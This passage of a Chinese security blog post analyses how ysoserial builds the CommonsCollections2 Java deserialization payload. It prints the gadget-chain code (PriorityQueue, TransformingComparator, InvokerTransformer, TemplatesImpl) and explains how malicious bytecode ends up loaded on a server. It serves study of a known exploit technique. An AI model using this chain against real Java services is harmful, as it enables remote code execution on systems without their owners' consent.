+<h2 id="cc2-payload分析"><a href="#cc2-payload分析" class="headerlink" title="cc2 payload分析"></a>cc2 payload分析</h2><p>来看yso如何实现的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<span class="comment">//命令参数传入createTemplatesImpl方法</span></span><br><span class="line">      <span class="comment">// mock method name until armed</span></span><br><span class="line">       <span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,  <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">       <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span>  TransformingComparator(transformer));</span><br><span class="line">       <span class="comment">// stub data for replacement later</span></span><br><span class="line">       queue.add(<span class="number">1</span>);</span><br><span class="line">       queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch method called by comparator</span></span><br><span class="line">       Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch contents of queue</span></span><br><span class="line">       <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue,  <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">       queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">       queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先将我们命令参数传入Gadgets.createTemplatesImpl方法</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/8.png" alt="8"><br>跟进</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/9.png" alt="9"></p>
+<p>先通过 System.getProperty() 方法获取系统属性 properXalan 的值做if判断，都是调用createTemplatesImpl的重载方法，判断值为true时使用全限定类名传参，反之使用非限定类名传参</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/10.png" alt="10"><br>这里生成clazz类，父类为AbstractTranslet，和之前的paylaod一样，继续<br>通过toBytecode() 方法获取恶意类的字节码 , 并通过 Java 反射机制将字节码填充到 TemplatesImpl 实例对象的 _ bytecodes 属性数组中</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/11.png" alt="11"><br>到这里返回一个携带恶意类字节码的 TemplatesImpl 实例对象，这个方法做了两件事，一是动态创建一个恶意类，二是将字节码插入到TemplatesImpl对象返回。</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/12.png" alt="12"></p>
+<p>定义一个invokertransform类型的transform实例对象，传入TransformingComparator构造方法中作为队列的参数</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/13.png" alt="13"></p>
+<p>优先级队列每次比较时都会调用比较器的 compare() 方法 , 当服务端执行到这里时 , 就会调用 TransformingComparator.compare() 方法 .进而调用 this.transformer.transform(obj1) 方法 , 即执行 : InvokerTransformer.transform() 方法 , 进入可控的反射调用.</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/14.png" alt="14"></p>
+<p>反射调用 newTransformer() 方法,为什么调用该方法，跟进看看</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/15.png" alt="15"></p>
+<p>跟进getTransletInstance()</p>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/16.png" alt="16"></p>
+<p>通过字节码加载恶意类并实例化。<br>最后传入恶意字节码到queue最后实现序列化</p>
+<p>defineTransletClasses实现如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span>  TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/17.png" alt="17"></p>
+<p>其实这样分析不了很清楚，还是根据payload自己搭环境分析清楚一点，只是想熟悉一下该工具，以后学习可以根据payload分析之后再根据该工具自行编写payload会好一点。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/12571787.html">https://www.cnblogs.com/litlife/p/12571787.html</a><br><a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/07/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e5-%e8%a7%a3%e5%af%86-ysoserial-java%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86%e6%9c%ba%e5%88%b6/">https://www.guildhab.top/2020/07/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e5-%e8%a7%a3%e5%af%86-ysoserial-java%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86%e6%9c%ba%e5%88%b6/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/19/cc2%E9%93%BE/" rel="prev" title="cc2链">
+                  <i class="fa fa-chevron-left"></i> cc2链
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">热爱篮球和安全的小伙子</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
